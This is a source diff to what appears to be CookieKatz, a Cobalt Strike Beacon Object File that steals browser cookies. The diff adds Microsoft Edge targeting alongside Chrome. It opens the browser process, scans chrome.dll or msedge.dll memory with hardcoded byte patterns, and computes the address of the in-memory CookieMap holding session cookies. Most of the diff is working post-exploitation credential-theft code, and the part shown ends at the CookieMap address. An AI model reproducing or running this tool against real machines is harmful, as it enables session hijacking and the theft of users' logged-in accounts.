@@ -18,6 +18,8 @@
 
 extern "C" {
 #include "beacon.h"
+    DFR(MSVCRT, _stricmp);
+#define _stricmp MSVCRT$_stricmp
 
     //This is important!
     void banner() {
@@ -27,7 +29,7 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
         BeaconPrintf(CALLBACK_OUTPUT, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
         BeaconPrintf(CALLBACK_OUTPUT, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
-        BeaconPrintf(CALLBACK_OUTPUT, " By Meckazin                      github.com/Meckazin \n");
+        BeaconPrintf(CALLBACK_OUTPUT, "By Meckazin                      github.com/Meckazin \n");
     };
 
     void ConvertToByteArray(uintptr_t value, BYTE* byteArray, size_t size) {
@@ -37,13 +39,97 @@ extern "C" {
         }
     }
 
+
+    //Example inputs:
+    //  edge:   0a000000060000002f6564676500
+    //  chrome: 0c000000080000002f6368726f6d6500
+    //  edge and PID: 0e000000060000002f6564676500f41e0000
+    // Remember, first flag then PID!
+    /* Beacon > addString / edge
+       Beacon > addint 7924
+       Beacon > generate
+       0e000000060000002f6564676500f41e0000
+    */
     void go(char* args, int len) {
         banner();
-        BeaconPrintf(CALLBACK_OUTPUT, "CookieKatz!\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n\n");
 
+        DWORD chromePid = 0;
+        LPCSTR targetConfig = NULL;
         datap parser;
         BeaconDataParse(&parser, args, len);
-        DWORD chromePid = (DWORD)BeaconDataInt(&parser);
+        if (parser.original == 0)
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome or /edge!\n");
+            return;
+        }
+        targetConfig = BeaconDataExtract(&parser, NULL);
+        chromePid = (DWORD)BeaconDataInt(&parser);
+
+        LPCWSTR processName;
+        LPCWSTR dllName;
+        const size_t szPattern = 144; //This for allocation
+        BYTE pattern[szPattern];
+        size_t szActualPattern = 0; //This is for pattern matching
+        
+        //If chrome
+        if (_stricmp(targetConfig, "/chrome") == 0) 
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Chrome\n");
+            processName = L"chrome.exe";
+            dllName = L"chrome.dll";
+            szActualPattern = 105;
+            BYTE chromePattern[] = {
+                0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89,
+                0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x08,
+                0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xFD, 0x48, 0x89,
+                0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC,
+                0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x41, 0x56,
+                0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x4D, 0x89,
+                0xCE, 0x4C, 0x89, 0xC7, 0x48, 0x89, 0xD6, 0x48, 0x89, 0xCB,
+                0x49, 0x8B, 0x01, 0x48, 0x8B, 0x11, 0x48, 0x8B, 0x0E, 0xFF,
+                0x15, 0xAA, 0xAA, 0xAA, 0x05, 0x89, 0xC5, 0x49, 0x8B, 0x06,
+                0x48, 0x8B, 0x16, 0x48, 0x8B, 0x0F, 0xFF, 0x15, 0xAA, 0xAA,
+                0xAA, 0x05, 0x40, 0x84, 0xED, 0x75, 0x0F, 0x84, 0xC0, 0x75,
+                0x39, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0x5D, 0x5F, 0x5E, 0x41,
+                0x5E, 0xC3, 0x48, 0x8B, 0x13, 0x84, 0xC0, 0x75, 0x54, 0x48,
+                0x8B, 0x06, 0x48, 0x89, 0x03, 0x48, 0x89, 0x16, 0x49, 0x8B,
+                0x06, 0x48, 0x8B, 0x0F
+            };
+            for (size_t i = 0; i < szActualPattern; ++i) //Oh god the sphaghetti is everywhere!
+                pattern[i] = chromePattern[i];
+
+        }  //If edge
+        else if (_stricmp(targetConfig, "/edge") == 0) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Edge\n");
+            processName = L"msedge.exe";
+            dllName = L"msedge.dll";
+            szActualPattern = 144;
+            BYTE edgePattern[] = {
+                0x56, 0x57, 0x48, 0x83, 0xEC, 0x28, 0x89, 0xD7, 0x48, 0x89,
+                0xCE, 0xE8, 0xAA, 0xAA, 0xFF, 0xFF, 0x85, 0xFF, 0x74, 0x08,
+                0x48, 0x89, 0xF1, 0xE8, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89,
+                0xF0, 0x48, 0x83, 0xC4, 0x28, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC,
+                0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x41, 0x56,
+                0x56, 0x57, 0x53, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x19,
+                0x4C, 0x8B, 0x33, 0x4D, 0x85, 0xF6, 0x74, 0x09, 0x48, 0x89,
+                0xCE, 0x48, 0x8B, 0x7B, 0x08, 0xEB, 0x16, 0x48, 0x83, 0xC4,
+                0x28, 0xAA, 0xAA, 0xAA, 0x41, 0x5E, 0xC3, 0x48, 0x83, 0xC7,
+                0xF8, 0x48, 0x89, 0xF9, 0xE8, 0x1D, 0x00, 0x00, 0xAA, 0xAA,
+                0xAA, 0xF7, 0x75, 0xEF, 0x4C, 0x89, 0x73, 0x08, 0x48, 0x8B,
+                0x06, 0x48, 0x8B, 0x08, 0x48, 0x83, 0xC4, 0x28, 0x5B, 0x5F,
+                0x5E, 0x41, 0x5E, 0xE9, 0xAA, 0xAA, 0xAA, 0xAA, 0x56, 0x48,
+                0x83, 0xEC, 0x20, 0x48, 0x85, 0xC9, 0x74, 0x2A, 0x48, 0x8B,
+                0x31, 0x48, 0xC7, 0x01
+            };
+            for (size_t i = 0; i < szActualPattern; ++i) //Oh god the sphaghetti is everywhere!
+                pattern[i] = edgePattern[i];
+        }
+        else
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge or /chrome to specify target!\n");
+            return;
+        }
 
         HANDLE hChrome;
         if (chromePid != 0) {
@@ -55,45 +141,59 @@ extern "C" {
             }
         }
         else {
-            BeaconPrintf(CALLBACK_OUTPUT, "[*] No PID specified, searching for Chrome process\n");
-            if (!FindCorrectChromePID(&chromePid, &hChrome)) {
-                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find suitable Chrome process\n");
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] No PID specified, searching for browser process\n");
+            if (!FindCorrectProcessPID(processName, &chromePid, &hChrome)) {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find suitable browser process\n");
                 return;
             }
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Targeting PID: %d\n", chromePid);
         }
 
         uintptr_t baseAddress = 0;
-        if (!GetRemoteModuleBaseAddress(hChrome, L"chrome.dll", baseAddress))
+        DWORD moduleSize = 0;
+        if (!GetRemoteModuleBaseAddress(hChrome, dllName, baseAddress, &moduleSize))
         {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find chrome.dll base address!\n");
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find %ls base address!\n", dllName);
             CloseHandle(hChrome);
             return;
         }
-#if defined(_DEBUG)
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found chrome.dll base address on 0x%p\n", (void*)baseAddress);
+        
+#ifdef _DEBUG
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found the %ls base address on 0x%p\n", dllName,(void*)baseAddress);
 #endif
-        const uintptr_t offset = 0xBC84B70;
-        baseAddress += offset;
-
-#if defined(_DEBUG)
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying to search for pattern 0x%p\n", (void*)baseAddress);
-#endif
-        const size_t patternSize = sizeof(uintptr_t);
-        BYTE pattern[patternSize];
-
-        ConvertToByteArray(baseAddress, pattern, patternSize);
-
         uintptr_t resultAddress = 0;
-        if (!FindPattern(hChrome, pattern, sizeof(pattern), resultAddress)) {
-            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the target pattern!\n");
+        if (!FindDllPattern(hChrome, pattern, szActualPattern, baseAddress, moduleSize, resultAddress)) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to find the first pattern\n");
             CloseHandle(hChrome);
             return;
         }
-#if defined(_DEBUG)
-        BeaconPrintf(CALLBACK_OUTPUT, "[*] Pattern found at address 0x%p\n", (void*)resultAddress);
+
+#ifdef _DEBUG
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found first pattern on 0x%p\n", (void*)resultAddress);
 #endif
-        uintptr_t CookieMapOffset = 0x28;
+        BYTE secondPattern[sizeof(uintptr_t)];
+        ConvertToByteArray(resultAddress, secondPattern, sizeof(uintptr_t));
+
+        if (!FindDllPattern(hChrome, secondPattern, sizeof(uintptr_t), baseAddress, moduleSize, resultAddress)) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the first target pattern!\n");
+            CloseHandle(hChrome);
+            return;
+        }
+#ifdef _DEBUG
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found second pattern on 0x%p\n", (void*)resultAddress);
+#endif
+
+        BYTE thirdPattern[sizeof(uintptr_t)];
+        ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));
+        if (!FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), resultAddress)) {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to find the third pattern!\n");
+            CloseHandle(hChrome);
+            return;
+    }
+#ifdef _DEBUG
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] Found third pattern on 0x%p\n", (void*)resultAddress);
+#endif
+        uintptr_t CookieMapOffset = 0x28; //Hardcoded, this seems to be the case no matter what version or browser (Chrome, Chromium, Edge)
         CookieMapOffset += resultAddress + sizeof(uintptr_t); //Include the length of the result address as well
 #if defined(_DEBUG)
         BeaconPrintf(CALLBACK_OUTPUT, "[*] CookieMap should be found in address 0x%p\n", (void*)CookieMapOffset);
